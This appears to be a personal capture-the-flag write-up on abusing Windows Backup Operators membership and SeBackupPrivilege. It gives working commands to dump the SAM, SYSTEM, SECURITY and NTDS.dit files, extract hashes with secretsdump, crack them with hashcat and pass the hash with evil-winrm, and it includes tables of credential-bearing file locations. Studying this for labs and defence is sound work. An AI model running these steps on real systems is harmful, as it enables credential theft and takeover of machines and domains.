
I was recently doing a box where I exploited a user who had `SeBackupPrivilege` as disabled and was in the built in group `Backup Operators`.
How to exploit this? Answer by taking backups of SAM and system files or some other sensitive file or just the root/Administrative flag.

 Note I got thrown off because the `SeBackupPrivilege` was disabled this lead to me going down a rabbit hole where I learnt something interesting.

How to Enable it => Using this [application](https://github.com/giuliano108/SeBackupPrivilege/) 
Steps are given in this [article](https://pentestlab.blog/tag/sebackupprivilege/) but this did not work because the user that I logged in as did not have access to run PowerShell for some reason. So this was a road block. Regardless this is a nice tool to know about.

But what did I miss some how enumerating this user first time I missed  that this user is part of `Backup Operators group` this its self is enough I did not even need to look at backup privilege.

Taking the backup of sensitive file like SAM and system file is enough for further escalation. 

## Copy Registry Hives**

Now, copy the SAM, SYSTEM, and SECURITY files:
```
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
reg save hklm\security C:\Temp\security
```
**`HKLM` (HKEY_LOCAL_MACHINE)** is a **registry hive** in Windows. It stores system-wide settings, configurations, and security information.

Or use **robocopy**:
```
robocopy C:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY /B
```

Cracking the hashes
`impacket-secretsdump -sam sam -system system -security security LOCAL`

**Pass-the-Hash attack**
`evil-winrm -i VICTIM-IP -u Administrator -H <NTLM-HASH>`

**Crack the hashes** using `hashcat`:
`hashcat -m 1000 <HASH> /path/to/rockyou.txt --force`



Other Sensitive files
The `SECURITY` hive contains **LSA Secrets**, which can store:

- Cached credentials
- Service account passwords
- Other sensitive system information
`reg save hklm\security C:\Temp\security.save`

**If this is a Domain Controller**, `NTDS.dit` contains **hashed passwords** for all domain users.
`robocopy /b C:\Windows\NTDS C:\Temp\Backup ntds.dit`

**System Event Logs (Logs Admin Login Attempts)**
`copy /b C:\Windows\System32\winevt\Logs\Security.evtx C:\Temp\Security.evtx`

If REG SAVE doesn’t work, try this alternative:
```
copy /b C:\Windows\System32\config\sam C:\Temp\sam.alt copy /b C:\Windows\System32\config\system C:\Temp\system.alt
```

If you want to back up **all** files in the directory:
``robocopy /b "C:\Users\enterpriseadmin\Desktop" "C:\Temp" /e``

#### Transfer these file with web server or with SCP
The hashes will be extracted with the above shown step with `impacket-secretsdump`
Then crack it with hashcat 
``hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force``



🔹 **Understanding SeBackupPrivilege "Disabled" but Still Working**
When a privilege is listed as **Disabled**, it **does not mean you cannot use it**—it just means it is **not currently enabled for use in your process**. However, if your user account **has the right to enable it**, Windows allows certain functions (like backup APIs) to use it without explicitly enabling it.

**🔹 How Does It Still Work?**

1️⃣ **SeBackupPrivilege is assigned to your user**

- Even though it shows **Disabled**, it is still assigned to your user account.

2️⃣ **Backup APIs Automatically Enable It**

- When you run commands like:
	`reg save hklm\sam C:\Temp\sam.save`
	The **Registry Backup API** automatically enables the privilege for that operation.
	
**🔹 Key Takeaway**

- "Disabled" in `whoami /priv` **does not** mean you cannot use it.
- Windows **automatically enables it** when you perform backup-related operations.
- Some tools and APIs **require manual enabling**, but `reg save`, `robocopy`, and `BackupRead` **do not**.
- **"Disabled"** means the key is in your pocket, but you can still use it when needed.

All the commands that are use full in this kind of situation.

Check privileges
`whoami /priv`
`(Get-TokenInformation (Get-Process -Id $PID).Handle -TokenPrivileges).Privileges`

Check groups
`whoami /groups`
`net localgroup Administrators`
`Get-LocalGroupMember Administrators`

Check privileges of another user
`whoami /user /fo list`
`Get-LocalUser -Name <username> | Select-Object *`

Some of the sensitive files that are useful
### **Standalone Machine (Non-Domain)**

These files contain passwords, hashes, configurations, or security-sensitive data:

|File|Location|Purpose|
|---|---|---|
|**SAM (Security Account Manager)**|`C:\Windows\System32\config\SAM`|Stores local user account password hashes (can be cracked)|
|**SYSTEM**|`C:\Windows\System32\config\SYSTEM`|Contains encryption key needed to extract SAM hashes|
|**SECURITY**|`C:\Windows\System32\config\SECURITY`|Stores LSA secrets (may contain plaintext passwords)|
|**NTDS.dit**|❌ _Not present (only in domain machines)_|N/A|
|**Registry Hives (Backup)**|`C:\Windows\System32\config\RegBack\`|Backup copies of SAM, SYSTEM, and SECURITY|
|**Cached Credentials**|`C:\Windows\System32\config\SAM`|Stores cached logins for offline access|
|**Credential Store**|`C:\Users\<username>\AppData\Local\Microsoft\Credentials`|Stores saved credentials (unencrypted but encoded)|
|**Wi-Fi Passwords**|`C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\`|Stores saved Wi-Fi passwords (decryptable with `netsh`)|
|**LSASS Process Dump**|`C:\Windows\System32\lsass.exe`|In-memory credential storage (can be dumped and analyzed with Mimikatz)|

---

### **Domain-Joined Machine (Active Directory)**

These files are present on **Domain Controllers (DCs)** or **domain-joined machines** and contain **high-value credentials**:

|File|Location|Purpose|
|---|---|---|
|**NTDS.dit (Active Directory Database)**|`C:\Windows\NTDS\NTDS.dit`|Contains all domain users' hashes (goldmine for attackers)|
|**SYSTEM (Decryption Key for NTDS.dit)**|`C:\Windows\System32\config\SYSTEM`|Needed to decrypt NTDS.dit|
|**Group Policy Passwords**|`C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups.xml`|Stores plaintext local admin passwords (from Group Policy Preferences)|
|**SYSVOL (Domain-Wide Scripts & Policies)**|`C:\Windows\SYSVOL\domain\`|May contain scripts with hardcoded credentials|
|**KRBTGT Hash (Used for Golden Ticket Attacks)**|Extracted from NTDS.dit|Allows forging Kerberos tickets for domain persistence|
|**DPAPI Master Keys**|`C:\Users\<username>\AppData\Roaming\Microsoft\Protect\`|Can decrypt stored passwords in browsers & apps|
|**LSASS Process Dump (Domain)**|`C:\Windows\System32\lsass.exe`|Contains cached domain admin credentials|

---
### **Summary**

✔ **Standalone Machines** → Focus on **SAM, SYSTEM, SECURITY, LSASS dump, Wi-Fi passwords**  
✔ **Domain Machines** → Focus on **NTDS.dit, SYSVOL, GPP passwords, KRBTGT, LSASS dump**

If you have **SeBackupPrivilege**, you can **backup these files** and exfiltrate them for **offline cracking**! 🚀

Note If you have `SeRestorePrivilege` then you can also re-write the files.
